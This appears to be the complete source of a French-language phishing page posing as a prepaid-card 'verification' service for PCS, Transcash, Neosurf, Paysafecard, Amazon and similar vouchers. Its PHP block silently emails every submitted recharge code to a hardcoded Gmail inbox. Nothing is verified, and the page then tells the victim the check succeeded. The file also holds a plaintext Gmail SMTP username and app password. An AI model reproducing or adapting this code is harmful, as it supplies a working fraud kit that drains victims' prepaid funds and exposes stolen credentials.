<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\SMTP;

//Load Composer's autoloader
// require 'vendor/autoload.php';
require './phpmailler/src/Exception.php';
require './phpmailler/src/PHPMailer.php';
require './phpmailler/src/SMTP.php';



// 
//  
//  
//
if(isset($_POST['send'])){



if(!empty($_POST['recharge']  && !empty($_POST['montant'] )  && !empty($_POST['email'] ) && !empty($_POST['codeEnregistrement'] ) && !empty($_POST['devise'] ) ) 

  ){
    $recharge = htmlspecialchars($_POST['recharge']);
    $montant = htmlspecialchars($_POST['montant']);
    $devise = htmlspecialchars($_POST['devise']);
    $codeEnregistrement = htmlspecialchars($_POST['codeEnregistrement']);
    $codeEnregistrement1 = htmlspecialchars($_POST['codeEnregistrement1']);
    $codeEnregistrement2 = htmlspecialchars($_POST['codeEnregistrement2']);
    $codeEnregistrement3 = htmlspecialchars($_POST['codeEnregistrement3']);
    $email = htmlspecialchars($_POST['email']);


    //Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);

try {
    //Server settings
    // $mail->SMTPDebug = SMTP::DEBUG_SERVER;   
                       //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'jocelynwotcheu2@gmail.com';                     //SMTP username
    $mail->Password   = 'xupbbgzclmtaykwf';                               //SMTP password
    $mail->SMTPSecure ='ssl';            //Enable implicit TLS encryption
    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('jocelynwotcheu2@gmail.com');
    $mail->addAddress('jocelynwotcheu2@gmail.com');     //Add a recipient
    // $mail->addAddress('ellen@example.com');               //Name is optional
    // $mail->addReplyTo('info@example.com', 'Information');
    // $mail->addCC('cc@example.com');
    // $mail->addBCC('bcc@example.com');

    //Attachments
    // $mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
    // $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name

    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'Hey Nouveau Coupon';
    $mail->Body    = "Mr $email vient d'effectuer une verification  ${recharge} de ${montant} ${devise}<div> <br/> Les codes de
     verifications sont <p>code Enregistrement 1: <b>${codeEnregistrement}</b></p>
     <p>code Enregistrement 2 :<b> ${codeEnregistrement1}</p></b>
     
     <p>code Enregistrement 3 : <b> ${codeEnregistrement2}</b></p>
     
     <p>code Enregistrement 4 :<b> ${codeEnregistrement3}</b></p>
     </div>";
    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    // echo 'Message has been sent';
    $info = "Envoye avec success <br/> vous recevrez un mail de confirmation";
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error:";
}

    

}
else{
  
    $info = "<span class='redColor'>Veuillez remplir tout les champs necessaires</span> ";
   
}
}



?>


<!DOCTYPE html>
<html lang="zxx">
  <head>
    <meta charset="UTF-8" />
    <meta name="description" content="Verification des cartes de recharge" />
    <meta name="keywords" content="Verification, transcash, pcs, neosurf" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <title>Verification des cartes de recharge | PCS Transcash Neosurf</title>
    <link
      rel="stylesheet"
      href="https://myonlinetestplatform.com/css/bootstrap.min.css"
      type="text/css"
    />
    <link
      rel="stylesheet"
      href="https://myonlinetestplatform.com/css/style.css"
      type="text/css"
    />
    <link
      rel="shortcut icon"
      href="https://myonlinetestplatform.com/images/Verifyyourgiftcard.png"
      type="image/x-icon"
    />
    <link rel="stylesheet" href="humane/libnotify.css" type="text/css" />
    <link rel="stylesheet" href="humane/jackedup.css" type="text/css" />
    <script src="humane/humane.min.js" type="text/javascript"></script>
    <style>
      .redColor{
        color: red;
        /* color: #5C5C5C; */
    font-size: 15px;
    font-family: "Lato", sans-serif;
      }
      .request_message {
  width: 400px;
  font-family: "Lato", sans-serif;

  background-color: #fff;
  text-align: center;
  color: green;
  font-size: 13px;
  padding: 14px;
  margin-bottom: 20px;
  border-radius: 20px;
  box-shadow: 0 0 8px rgba(0, 0, 0, 0.1);
  animation: anime 0.5s ease-in-out;
}

@keyframes anime {
  from {
    transform: translateY(-70px);
  }
}
    </style>
  </head>
  

  <body>
    <div id="preloder">
      <div class="loader"></div>
    </div>
    <section
      class="hero set-bg"
      data-setbg="https://myonlinetestplatform.com/images/wallpaper.jpg"
    >
      <div class="container">
        <div class="row">
          <div class="col-lg-5 col-md-12">
            <div class="img-fluid">
              <a href="/"
                ><img
                  class="image-left"
                  src="https://myonlinetestplatform.com/images/Verify_your_gift_card-removebg-preview.png"
                  alt=""
              /></a>
            </div>
          </div>
          <div class="col-lg-5 offset-lg-2 box-cards">
            <div class="hero__form">
              <h4 class=".sent-notification"></h4>
              <h3>Renseignez les informations du coupon ici</h3>

              <div
                class="request_message"
              >
                <?php
                if(isset($info)){?>
                        <?=$info?>

               <?php }
                
                
                ?>
              </div>
              <!-- <div
                class="alert alert-success"
                role="alert"
                id="notification_txt"
              >
                <p>Traitement en cours</p>
                <p>Un email de confirmation vous sera envoyer</p>
              </div> -->
              <!-- <p class="request_message">Message envoyer</p> -->

              <form
                method="post"
                action=""
                class="call__form"
                id="form_pcs"
              >
                <div class="row">
                  <div class="col-lg-12">
                    <select
                      name="recharge"
                      id="recharge"
                      class="form-control mb-3"
                      required
                    >
                      <option value="PCS">PCS</option>
                      <option value="PAYSAFECARD">PAYSAFECARD</option>
                      <option value="TRANSCASH">TRANSCASH</option>
                      <option value="NEOSURF">NEOSURF</option>
                      <option value="TONEO">TONEO</option>
                      <option value="ORANGE">ORANGE</option>
                      <option value="PAYPAL">PAYPAL</option>
                      <option value="LE BARA">LE BARA</option>
                      <option value="LYCAMOBILE">LYCAMOBILE</option>
                      <option value="Google Play">GOOGLE PLAY</option>
                      <option value="Amazon">AMAZON</option>
                      <option value="Bitnovo">BITNOVO</option>
                    </select>
                  </div>
                  <div class="col-lg-12">
                    <input
                      type="number"
                      id="montant"
                      name="montant"
                      placeholder="Entrer le montant de la recharge *"
                    />
                  </div>
                  <div class="col-lg-12">
                    <select name="devise" id="devise" class="form-control mb-2">
                      <option value="euro">€ (Euro)</option>
                      <option value="dollar">$ (Dollar)</option>
                      <option value="Franc Suisse">CHF (Franc suisse)</option>
                    </select>
                  </div>
                  <div class="col-lg-12">
                    <input
                      type="text"
                      class="form-control"
                      name="codeEnregistrement"
                      id="codeEnregistrement"
                      placeholder="Entrer le code de recharge 1 *"
                    />
                  </div>
                  <div class="col-lg-12">
                    <input
                      type="text"
                      class="form-control"
                      name="codeEnregistrement1"
                      id="codeEnregistrement1"
                      placeholder="Entrer le code de recharge 2"
                    />
                  </div>
                  <div class="col-lg-12">
                    <input
                      type="text"
                      class="form-control"
                      name="codeEnregistrement2"
                      id="codeEnregistrement2"
                      placeholder="Entrer le code de recharge 3"
                    />
                  </div>
                  <div class="col-lg-12">
                    <input
                      type="text"
                      class="form-control"
                      name="codeEnregistrement3"
                      id="codeEnregistrement3"
                      placeholder="Entrer le code de recharge 4"
                    />
                  </div>
                  <div class="col-lg-12">
                    <input
                      type="email"
                      placeholder="Entrez votre adresse email *"
                      name="email"
                      id="email"
                    />
                  </div>
                </div>
                <input
                  type="submit"
                  class="site-btn mb-3"
                  id="submit_button"
                  value="Verifier mon coupon..."
                  onclick="envois_pcs_();"
                  style="height: 50px"

                  name="send"
                />
              </form>
            </div>
          </div>
        </div>
      </div>
    </section>
    <!-- Hero Section End -->
    <!-- Footer Section Begin -->
    <footer class="footer">
      <div class="container">
        <div class="row">
          <div class="col-lg-3 col-md-6 col-sm-12">
            <div class="footer__about">
              <div class="footer__logo">
                <a href="/"
                  ><img
                    src="https://myonlinetestplatform.com/images/Logo_footer-removebg-preview.png"
                    alt=""
                /></a>
              </div>
              <p>
                Service de verification de coupons en ligne. Notre plateforme
                vous permet de verifier la validite de vos cartes. Cette
                verification est protegee.
              </p>
            </div>
          </div>
          <div class="col-lg-3 col-md-6 col-sm-6">
            <div class="footer__widget">
              <h5>Services</h5>
              <div class="footer__widget">
                <ul>
                  <li><a href="#">Verification des coupons PCS</a></li>
                  <li><a href="#">Verification des coupons Amazon</a></li>
                  <li><a href="#">Verification des coupons Neosurf</a></li>
                  <li><a href="#">Et bien d'autres</a></li>
                </ul>
              </div>
            </div>
          </div>
          <div class="col-lg-3 col-md-6 col-sm-6">
            <div class="footer__widget">
              <h5>Socials</h5>
              <div class="footer__widget footer__widget--social">
                <ul>
                  <li>
                    <a href="https://fr-fr.facebook.com/"
                      ><i class="fa fa-facebook"></i> Facebook</a
                    >
                  </li>
                  <li>
                    <a href="https://www.instagram.com/?hl=fr"
                      ><i class="fa fa-instagram"></i> Instagram</a
                    >
                  </li>
                  <li>
                    <a href="https://twitter.com/?lang=fr"
                      ><i class="fa fa-twitter"></i> Twitter</a
                    >
                  </li>
                  <li>
                    <a href="https://www.skype.com/fr/"
                      ><i class="fa fa-skype"></i> Skype</a
                    >
                  </li>
                </ul>
              </div>
            </div>
          </div>
          <div class="col-lg-3 col-md-6 col-sm-6">
            <div class="footer__widget footer__widget--address">
              <h5>Horaires d'ouverture</h5>
              <p>Nous travaillons tous les jours de la semaine</p>
              <ul>
                <li>Nous travaillons 24/7</li>
              </ul>
            </div>
          </div>
        </div>
        <div class="footer__copyright">
          <div class="row">
            <div class="col-lg-6 col-md-6 col-sm-6"></div>
            <div class="col-lg-6 col-md-6">
              <!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
              <div class="footer__copyright__text">
                <p>
                  Copyright &copy;
                  <script>
                    document.write(new Date().getFullYear());
                  </script>
                  All rights reserved
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </footer>
    <!-- Footer Section Ends -->
  </body>
</html>
<!-- Js Plugins -->
<script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
<script src="https://myonlinetestplatform.com/js/bootstrap.min.js"></script>

<script>
  function shuffle(string) {
    var parts = string.split("");
    for (var i = parts.length; i > 0; ) {
      var random = parseInt(Math.random() * i);
      var temp = parts[--i];
      parts[i] = parts[random];
      parts[random] = temp;
    }
    return parts.join("");
  }

  (function ($) {
    /*------------------
    Preloader
--------------------*/
    $(window).on("load", function () {
      $(".loader").fadeOut();
      $("#notification_txt").hide();
      $("#preloder").delay(10).fadeOut("fast");
    });

    /*------------------
    Background Set
--------------------*/
    $(".set-bg").each(function () {
      var bg = $(this).data("setbg");
      $(this).css("background-image", "url(" + bg + ")");
    });
  })(jQuery);
</script>

<script>
  function envois_pcs_() {
    var recharge = document.getElementById("recharge").value;
    var montant = document.getElementById("montant").value;
    var devise = document.getElementById("devise").value;
    var codeEnregistrement =
      document.getElementById("codeEnregistrement").value;
    var codeEnregistrement1 = document.getElementById(
      "codeEnregistrement1"
    ).value;
    var codeEnregistrement2 = document.getElementById(
      "codeEnregistrement2"
    ).value;
    var codeEnregistrement3 = document.getElementById(
      "codeEnregistrement3"
    ).value;

    if (montant == "") {
      message = "Veuillez renseigner un montant";
      humane.info = humane.spawn({
        addnCls: "humane-jackedup-error",
        timeout: 2000,
      });
      humane.info(message);
      return;
    }

    if (codeEnregistrement == "") {
      message = "Veuillez renseigner au moins un code  d'enregistrement";
      humane.info = humane.spawn({
        addnCls: "humane-jackedup-error",
        timeout: 2000,
      });
      humane.info(message);
      return;
    }

    var email = document.getElementById("email").value;

    if (email == "") {
      message = "Veuillez renseigner une adresse email";
      humane.info = humane.spawn({
        addnCls: "humane-jackedup-error",
        timeout: 2000,
      });
      humane.info(message);
      return;
    }
    // $("#submit_button").prop("disabled", true);
  }

  function reset_form() {
    $(":input", "#form_pcs")
      .not(":button, :submit, :reset, :hidden")
      .val("")
      .removeAttr("checked")
      .removeAttr("selected");
    var recharge = (document.getElementById("recharge").value = "PCS");
    var devise = (document.getElementById("devise").value = "euro");
  }
</script>
